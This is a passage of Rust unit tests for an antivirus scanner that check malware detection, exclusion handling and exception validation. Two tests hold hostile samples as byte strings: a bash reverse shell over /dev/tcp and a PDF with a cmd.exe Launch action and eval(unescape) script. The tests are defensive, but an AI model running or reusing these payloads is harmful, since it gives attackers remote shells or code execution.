    fn test_linux_threat_detection() {
        let scanner = MultiEngineScanner::new();
        let payload = b"#!/bin/bash\n/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1\n";
        let res = scanner.scan_bytes(payload, "revshell.sh");
        assert_eq!(res.status, FileScanStatus::Infected);
        assert!(res.detection_name.unwrap().contains("ReverseShell"));
    }

    #[test]
    fn test_pdf_clean_high_entropy_not_flagged() {
        let scanner = MultiEngineScanner::new();
        let mut pdf_data = b"%PDF-1.7\n".to_vec();
        let mut pseudo_rand = vec![0u8; 10000];
        for (i, b) in pseudo_rand.iter_mut().enumerate() {
            *b = ((i * 101 + 37) % 256) as u8;
        }
        pdf_data.extend_from_slice(&pseudo_rand);

        let res = scanner.scan_bytes(&pdf_data, "document.pdf");
        assert_eq!(res.status, FileScanStatus::Clean);
    }

    #[test]
    fn test_pdf_with_active_script_detected() {
        let scanner = MultiEngineScanner::new();
        let mut pdf_data =
            b"%PDF-1.7\n/Type /Action /S /Launch /F (cmd.exe) /JavaScript /JS (eval(unescape('%u0041')))\n".to_vec();
        let mut pseudo_rand = vec![0u8; 5000];
        for (i, b) in pseudo_rand.iter_mut().enumerate() {
            *b = ((i * 101 + 37) % 256) as u8;
        }
        pdf_data.extend_from_slice(&pseudo_rand);

        let res = scanner.scan_bytes(&pdf_data, "invoice.pdf");
        assert_eq!(res.status, FileScanStatus::Infected);
        assert!(res
            .detection_name
            .unwrap()
            .contains("Exploit.PDF.ActiveScriptOrLaunchTrigger"));
    }

    #[test]
    fn test_hash_pinned_exclusion_lifecycle() {
        let mut scanner = MultiEngineScanner::new();
        let temp_dir = std::env::temp_dir().join(format!("samu_excl_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&temp_dir);

        let test_file = temp_dir.join("admin_tool.dat");
        let suspicious_content = b"SAMULIBRE_TEST_TOKEN_SUSPICIOUS_PAYLOAD_VALIDATION; legitimate admin utility payload content";
        fs::write(&test_file, suspicious_content).unwrap();

        // 1. Escaneo antes de exclusión: debe ser detectado como infectado por la regla interna
        let res_before = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res_before.status, FileScanStatus::Infected);
        assert!(res_before
            .detection_name
            .unwrap()
            .contains("ExclusionValidation"));

        // 2. Añadir exclusión anclada criptográficamente (Hash Pinned)
        let pinned =
            scanner.add_pinned_exclusion(&test_file, "Herramienta legítima de administración IT");
        assert!(pinned.sha256.is_some());

        // 3. Escaneo tras exclusión válida: debe considerarse limpio por exclusión
        let res_after = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res_after.status, FileScanStatus::Clean);
        assert!(res_after.detection_name.unwrap().contains("HashPinned"));

        // 4. Manipulación del archivo: un atacante altera el archivo o inyecta otro payload
        let modified_content = b"SAMULIBRE_TEST_TOKEN_SUSPICIOUS_PAYLOAD_VALIDATION; modified payload altered by attacker";
        fs::write(&test_file, modified_content).unwrap();

        // 5. El escáner debe revocar la exclusión porque el hash SHA-256 no coincide, y marcar la infección
        let res_modified = scanner.scan_file(&test_file).unwrap();
        assert_eq!(
            res_modified.status,
            FileScanStatus::Infected,
            "Exclusión no debe aplicar si el archivo fue alterado"
        );

        let _ = fs::remove_dir_all(&temp_dir);
    }

    #[test]
    fn test_security_exception_validation_rules() {
        let mut scanner = MultiEngineScanner::new();

        // 1. Path traversal bloqueado
        let ex_traversal = samulibre_types::SecurityException {
            id: "test1".to_string(),
            name: "Traversal".to_string(),
            target: "C:\\Windows\\..\\System32".to_string(),
            exception_type: samulibre_types::ExceptionType::File {
                sha256_pinned: None,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::Other,
            justification: "test".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::High,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_traversal).is_err());

        // 2. Unidad de disco completa C:\ bloqueada
        let ex_root = samulibre_types::SecurityException {
            id: "test2".to_string(),
            name: "Root".to_string(),
            target: "C:\\".to_string(),
            exception_type: samulibre_types::ExceptionType::Folder {
                include_subdirectories: true,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::Other,
            justification: "test".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Critical,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_root).is_err());

        // 3. Componentes internos de SamuLibre bloqueados
        let ex_internal = samulibre_types::SecurityException {
            id: "test3".to_string(),
            name: "Internal".to_string(),
            target: "C:\\Users\\app\\Antivitus-SamuLibre\\data\\signatures".to_string(),
            exception_type: samulibre_types::ExceptionType::Folder {
                include_subdirectories: true,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::Other,
            justification: "test".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Critical,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_internal).is_err());

        // 4. Extensión ejecutable de alto riesgo (.exe) bloqueada
        let ex_exe = samulibre_types::SecurityException {
            id: "test4".to_string(),
            name: "Extension Exe".to_string(),
            target: ".exe".to_string(),
            exception_type: samulibre_types::ExceptionType::Extension {
                ext: "exe".to_string(),
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::Other,
            justification: "test".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Critical,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_exe).is_err());

        // 5. Extensión no ejecutable permitida (.log)
        let ex_log = samulibre_types::SecurityException {
            id: "test5".to_string(),
            name: "Extension Log".to_string(),
            target: ".log".to_string(),
            exception_type: samulibre_types::ExceptionType::Extension {
                ext: "log".to_string(),
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::SoftwareDevelopment,
            justification: "Logs de desarrollo".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Low,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        assert!(scanner.add_security_exception(ex_log).is_ok());
    }

    #[test]
    fn test_security_exception_expiration_and_toggle() {
        let mut scanner = MultiEngineScanner::new();
        let temp_dir =
            std::env::temp_dir().join(format!("samu_excl_exp_test_{}", std::process::id()));
        let _ = fs::create_dir_all(&temp_dir);

        let test_file = temp_dir.join("temp_tool.dat");
        let payload = b"SAMULIBRE_TEST_TOKEN_SUSPICIOUS_PAYLOAD_VALIDATION; temp admin task";
        fs::write(&test_file, payload).unwrap();

        // Crear excepción que expiró en el pasado (hace 10 minutos)
        let past_time = (chrono::Utc::now() - chrono::Duration::minutes(10)).to_rfc3339();
        let ex_expired = samulibre_types::SecurityException {
            id: "exp_test_id".to_string(),
            name: "Expired Exception".to_string(),
            target: test_file.to_string_lossy().to_string(),
            exception_type: samulibre_types::ExceptionType::File {
                sha256_pinned: None,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::AdministrativeTool,
            justification: "Mantenimiento temporal finalizado".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Low,
            created_at: "hace 1 hora".to_string(),
            expires_at: Some(past_time),
            is_active: true,
            audit_history: Vec::new(),
        };
        scanner.add_security_exception(ex_expired).unwrap();

        // Al escanear, la excepción vencida NO debe aplicar y la amenaza debe ser detectada
        let res = scanner.scan_file(&test_file).unwrap();
        assert_eq!(
            res.status,
            FileScanStatus::Infected,
            "Excepción vencida no debe excluir la amenaza"
        );

        // Crear excepción permanente activa
        let ex_active = samulibre_types::SecurityException {
            id: "active_test_id".to_string(),
            name: "Active Exception".to_string(),
            target: test_file.to_string_lossy().to_string(),
            exception_type: samulibre_types::ExceptionType::File {
                sha256_pinned: None,
            },
            scope: samulibre_types::ExceptionScope::default(),
            reason_category: samulibre_types::ReasonCategory::InvestigatedFalsePositive,
            justification: "Falso positivo verificado".to_string(),
            risk_level: samulibre_types::ExceptionRiskLevel::Low,
            created_at: "now".to_string(),
            expires_at: None,
            is_active: true,
            audit_history: Vec::new(),
        };
        scanner.add_security_exception(ex_active).unwrap();

        // Ahora debe estar limpia
        let res_clean = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res_clean.status, FileScanStatus::Clean);

        // Desactivar temporalmente la excepción
        let toggled = scanner.toggle_security_exception("active_test_id");
        assert_eq!(toggled, Some(false));

        // Debe volver a detectarse como infectada mientras esté desactivada
        let res_deactivated = scanner.scan_file(&test_file).unwrap();
        assert_eq!(res_deactivated.status, FileScanStatus::Infected);

        let _ = fs::remove_dir_all(&temp_dir);
    }
}
